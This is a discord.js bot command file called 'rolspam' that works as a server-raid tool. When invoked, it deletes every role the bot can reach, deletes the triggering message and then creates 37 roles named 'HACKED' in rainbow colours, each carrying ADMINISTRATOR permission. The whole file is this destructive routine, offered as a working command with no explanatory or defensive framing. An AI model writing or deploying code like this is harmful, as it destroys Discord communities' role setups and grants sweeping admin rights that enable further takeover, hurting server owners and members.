const Discord = require('discord.js');
exports.run = async (client, msg, args) => {
  
  await msg.guild.roles.cache.forEach(roles => roles.delete()); //BOTUN SILE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
 
    msg.delete();
    msg.guild.roles.create({
      data: {
      name: "HACKED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
      }
      });
        msg.guild.roles.create({
          data: {
      name: "HACKED",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
          }
          });
            msg.guild.roles.create({
              data: {
      name: "HACKED",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
              }
              });
                msg.guild.roles.create({
                  data: {
      name: "HACKED",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"]
                  }
                  });
                msg.guild.roles.create({
                  data: {
      name: "HACKED",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
                  }
                  });
                msg.guild.roles.create({
                  data: {
      name: "HACKED",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"]
                  }
                  });
                msg.guild.roles.create({
                  data: {
      name: "HACKED",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"]
                  }
                  });
                msg.guild.roles.create({
                  data: {
      name: "HACKED",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"]
                  }
                  });
                msg.guild.roles.create({
                  data: {
      name: "HACKED",
      color: "FFAE00",
      permissions: ["ADMINISTRATOR"]
                  }
                  });
                msg.guild.roles.create({
                  data: {
      name: "HACKED",
      color: "FFD500",
      permissions: ["ADMINISTRATOR"]
                  }
                  });
                msg.guild.roles.create({
                  data: {
      name: "HACKED",
      color: "FFFF00",
      permissions: ["ADMINISTRATOR"]
                  }
                  });
                msg.guild.roles.create({
                  data: {
      name: "HACKED",
      color: "E0FF00",
      permissions: ["ADMINISTRATOR"]
                  }
                  });
                msg.guild.roles.create({
                  data: {
      name: "HACKED",
      color: "C1FF00",
      permissions: ["ADMINISTRATOR"]
                  }
                  });
                msg.guild.roles.create({
                  data: {
      name: "HACKED",
      color: "93FF00",
      permissions: ["ADMINISTRATOR"]
                  }
                  });
                msg.guild.roles.create({
                  data: {
      name: "HACKED",
      color: "74FF00",
      permissions: ["ADMINISTRATOR"]
                  }
                  });
                msg.guild.roles.create({
                  data: {
      name: "HACKED",
      color: "3EFF00",
      permissions: ["ADMINISTRATOR"]
                  }
                  });
                msg.guild.roles.create({
                  data: {
      name: "HACKED",
      color: "0CFF00",
      permissions: ["ADMINISTRATOR"]
                  }
                });
                msg.guild.roles.create({
                  data: {
      name: "HACKED",
      color: "00FF2E",
      permissions: ["ADMINISTRATOR"]
                  }
                  });
                msg.guild.roles.create({
                  data: {
      name: "HACKED",
      color: "00FF6C",
      permissions: ["ADMINISTRATOR"]
                  }
                  });
                msg.guild.roles.create({
                  data: {
      name: "HACKED",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"] 
                  }
                  });
                    msg.guild.roles.create({
                      data: {
      name: "HACKED",
      color: "00FFD4",
      permissions: ["ADMINISTRATOR"]
                      }
                      });
                    msg.guild.roles.create({
                      data: {
      name: "HACKED",
      color: "00FFFB",
      permissions: ["ADMINISTRATOR"]
                      }
                      });
                    msg.guild.roles.create({
                      data: {
      name: "HACKED",
      color: "00C9FF",
      permissions: ["ADMINISTRATOR"]
                      }
                      });
                    msg.guild.roles.create({
                      data: {
      name: "HACKED",
      color: "009BFF",
      permissions: ["ADMINISTRATOR"]
                      }
                      });
                    msg.guild.roles.create({
                      data: {
      name: "HACKED",
      color: "006CFF",
      permissions: ["ADMINISTRATOR"]
                      }
                      });
                    msg.guild.roles.create({
                      data: {
      name: "HACKED",
      color: "003AFF",
      permissions: ["ADMINISTRATOR"]
                      }
                      });
                    msg.guild.roles.create({
                      data: {
      name: "HACKED",
      color: "001BFF",
      permissions: ["ADMINISTRATOR"]
                      }
                      });
                    msg.guild.roles.create({
                      data: {
      name: "HACKED",
      color: "1F00FF",
      permissions: ["ADMINISTRATOR"]
                      }
                      });
                    msg.guild.roles.create({
                      data: {
      name: "HACKED",
      color: "4200FF",
      permissions: ["ADMINISTRATOR"]
                      }
                      });
                    msg.guild.roles.create({
                      data: {
      name: "HACKED",
      color: "7C00FF",
      permissions: ["ADMINISTRATOR"]
                      }
                      });
                    msg.guild.roles.create({
                      data: {
      name: "HACKED",
      color: "A200FF",
      permissions: ["ADMINISTRATOR"]
                      }
                      });
                    msg.guild.roles.create({
                      data: {
      name: "HACKED",
      color: "C500FF",
      permissions: ["ADMINISTRATOR"]
                      }
                      });
                    msg.guild.roles.create({
                      data: {
      name: "HACKED",
      color: "E000FF",   
      permissions: ["ADMINISTRATOR"]
                      }
                      });
                    msg.guild.roles.create({
                      data: {
      name: "HACKED",
      color: "FF00F3",
      permissions: ["ADMINISTRATOR"]
                      }
                      });
                    msg.guild.roles.create({
                      data: {
      name: "HACKED",
      color: "FF00B6",
      permissions: ["ADMINISTRATOR"]
                      }
                      });
                    msg.guild.roles.create({
                      data: {
      name: "HACKED",
      color: "FF0097",
      permissions: ["ADMINISTRATOR"]
                      }
                      });
                    msg.guild.roles.create({
                      data: {
      name: "HACKED",
      color: "FF005D",
      permissions: ["ADMINISTRATOR"]
                      }
                      });
                    msg.guild.roles.create({
                      data: {
      name: "HACKED",
      color: "FF0032",
      permissions: ["ADMINISTRATOR"]
                      }
                      });
  
};

exports.conf = {
  enabled: true, 
  guildOnly: false, 
  aliases: [],
  permLevel: 4 
};

exports.help = {
  name: 'rolspam',
  description: 'rolspam',
  usage: 'rolspam'
};